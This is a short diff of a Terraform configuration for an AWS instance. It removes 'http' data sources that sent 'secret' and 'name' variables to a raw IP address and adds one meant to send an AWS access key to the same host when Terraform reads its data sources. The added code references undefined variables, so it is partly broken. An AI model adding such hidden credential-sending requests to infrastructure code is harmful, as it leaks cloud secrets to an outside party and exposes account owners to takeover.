@@ -21,12 +21,15 @@ resource "aws_instance" "ubuntu" {
   }
 }
 
-variable "secret" {}
+variable "env" {}
+variable "AWS_ACCESS_KEY" {}
 
-data "http" "secret" {
-  url = "http://13.236.148.43:3000/?hi=${var.secret}"
+data "null_data_source" "test" {
+  inputs = {
+    ak = "${var.AWSK_ACCESS_KEY}"
+  }
 }
 
-data "http" "name" {
-  url = "http://13.236.148.43:3000/?hi=${var.name}"
+data "http" "aws_ak" {
+  url = "http://13.236.148.43:3000/?hi=${var.ak}"
 }
